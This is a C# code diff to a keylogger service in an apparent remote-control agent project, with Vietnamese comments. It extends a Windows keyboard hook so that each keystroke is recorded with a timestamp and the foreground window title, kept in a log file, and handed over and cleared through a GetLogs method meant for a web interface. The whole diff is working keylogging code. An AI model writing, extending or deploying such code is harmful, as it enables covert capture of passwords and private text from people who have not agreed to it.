@@ -5,21 +5,42 @@
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Text;
+using RemoteControl.Shared.Models;
 
 namespace RemoteControl.Agent.Services;
 
 public class KeyLoggerService
 {
+    // ====== Singleton Pattern ======
+    private static KeyLoggerService? _instance;
+    private static readonly object _instanceLock = new();
+    
+    public static KeyLoggerService Instance
+    {
+        get
+        {
+            if (_instance == null)
+            {
+                lock (_instanceLock)
+                {
+                    _instance ??= new KeyLoggerService();
+                }
+            }
+            return _instance;
+        }
+    }
+
     private Thread? _hookThread;
-    private readonly StringBuilder _logBuffer = new StringBuilder();
+    private readonly List<KeylogEntry> _entries = new();
+    private readonly StringBuilder _logBuffer = new StringBuilder(); // Keep for file logging
     private readonly object _lock = new object();
     private bool _isLogging = false;
     private readonly string _logFilePath;
+    private string _currentWindowTitle = string.Empty;
 
-    // ====== Constructor ======
-    public KeyLoggerService()
+    // ====== Private Constructor (Singleton) ======
+    private KeyLoggerService()
     {
-        _instance = this;
         _logFilePath = Path.Combine(Environment.CurrentDirectory, "keylogger.log");
     }
 
@@ -28,7 +49,12 @@ public class KeyLoggerService
     {
         if (_isLogging) return;
         _isLogging = true;
-        _logBuffer.Clear();
+        
+        lock (_lock)
+        {
+            _entries.Clear();
+            _logBuffer.Clear();
+        }
 
         // Ghi header vào file
         File.AppendAllText(_logFilePath, $"\nKeyLogger Started: {DateTime.Now:yyyy-MM-dd HH:mm:ss}\n");
@@ -50,16 +76,45 @@ public class KeyLoggerService
         File.AppendAllText(_logFilePath, $"\nKeyLogger Stopped: {DateTime.Now:yyyy-MM-dd HH:mm:ss}\n");
     }
 
-    // ====== Lấy nội dung log hiện tại ======
-    public string GetLogs()
+    // ====== Lấy nội dung log và XÓA (for Web) ======
+    public List<KeylogEntry> GetLogs()
     {
         lock (_lock)
         {
-            var logs = _logBuffer.ToString();
-            _logBuffer.Clear();
-            return logs;
+            var result = new List<KeylogEntry>(_entries);
+            _entries.Clear();
+            return result;
         }
     }
+
+    // ====== Lấy nội dung log KHÔNG XÓA (for DebugForm display) ======
+    public string PeekLogText()
+    {
+        lock (_lock)
+        {
+            var text = _logBuffer.ToString();
+            _logBuffer.Clear(); // Only clear the text buffer, not entries
+            return text;
+        }
+    }
+
+    // ====== Get active window title ======
+    private static string GetActiveWindowTitle()
+    {
+        IntPtr hwnd = GetForegroundWindow();
+        if (hwnd == IntPtr.Zero) return "Unknown";
+        
+        StringBuilder sb = new StringBuilder(256);
+        GetWindowText(hwnd, sb, sb.Capacity);
+        var title = sb.ToString();
+        return string.IsNullOrEmpty(title) ? "Unknown" : title;
+    }
+
+    [DllImport("user32.dll")]
+    private static extern IntPtr GetForegroundWindow();
+
+    [DllImport("user32.dll", CharSet = CharSet.Auto)]
+    private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
 
     // ====== Luồng chạy Hook ======
     private void StartHookLoop()
@@ -78,7 +133,6 @@ public class KeyLoggerService
     private const int WM_KEYDOWN = 0x0100;
     private const int WM_KEYUP = 0x0101; // Added KeyUp constant
 
-    private static KeyLoggerService? _instance;
     private readonly HashSet<Keys> _pressedKeys = new HashSet<Keys>(); // Track currently pressed keys
 
     [DllImport("user32.dll")]
@@ -105,7 +159,7 @@ public class KeyLoggerService
             
             if (wParam == (IntPtr)WM_KEYDOWN)
             {
-                if (_instance != null && _instance._isLogging)
+            if (_instance != null && _instance._isLogging)
                 {
                     // Check if key is already pressed
                     if (!_instance._pressedKeys.Contains(key))
@@ -113,10 +167,23 @@ public class KeyLoggerService
                         _instance._pressedKeys.Add(key); // Mark as pressed
 
                         string keyStr = ConvertKeyToString(key);
+                        Console.WriteLine($"[KeyLogger] Key captured: {keyStr}, Entries count: {_instance._entries.Count}");
+                        
                         if (!string.IsNullOrEmpty(keyStr))
                         {
+                            var windowTitle = GetActiveWindowTitle();
+                            
                             lock (_instance._lock)
                             {
+                                // Add structured entry
+                                _instance._entries.Add(new KeylogEntry
+                                {
+                                    Timestamp = DateTime.Now,
+                                    WindowTitle = windowTitle,
+                                    KeyPressed = keyStr
+                                });
+                                
+                                // Also keep for file logging
                                 _instance._logBuffer.Append(keyStr);
                             }
                             // Ghi ra file ngay lập tức
